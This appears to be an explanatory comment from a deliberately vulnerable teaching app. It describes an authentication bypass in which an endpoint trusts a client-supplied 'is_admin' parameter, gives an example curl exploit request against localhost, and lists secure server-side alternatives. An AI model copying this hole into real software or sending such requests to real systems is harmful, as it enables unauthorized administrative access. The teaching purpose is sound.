üîç VULNERABILITY TYPE: Authentication Bypass via Client-Side Control

DESCRIPTION:
This endpoint demonstrates a critical authentication flaw where the application
trusts a client-supplied parameter ("is_admin") to determine user privileges.
This violates the fundamental security principle of "never trust user input."

üéØ ATTACK SCENARIO:
1. Attacker discovers the endpoint: /auth/bypass
2. Attacker analyzes the URL and tries: /auth/bypass?is_admin=1
3. Application immediately grants admin access without verification
4. Attacker gains unauthorized administrative privileges

EXAMPLE ATTACK:
curl "http://localhost:5000/auth/bypass?is_admin=1"
# Result: {"ok": True, "data": {"msg": "Welcome admin!"}}

üí• SECURITY IMPACT:
- CRITICAL: Complete authentication bypass
- Unauthorized administrative access
- Privilege escalation from anonymous to admin
- Potential access to sensitive administrative functions
- Violation of access control principles

üõ°Ô∏è WHY THIS IS DANGEROUS:
- Authentication should be server-side verification, not client-side flags
- URL parameters can be easily manipulated by attackers
- No actual verification of user identity or permissions
- Breaks the security model entirely

üìö SECURE ALTERNATIVE:
Instead of trusting client input, implement proper server-side authentication:
1. Verify user session/token on server
2. Check user permissions from authoritative database
3. Never rely on client-supplied authorization data
4. Implement proper session management
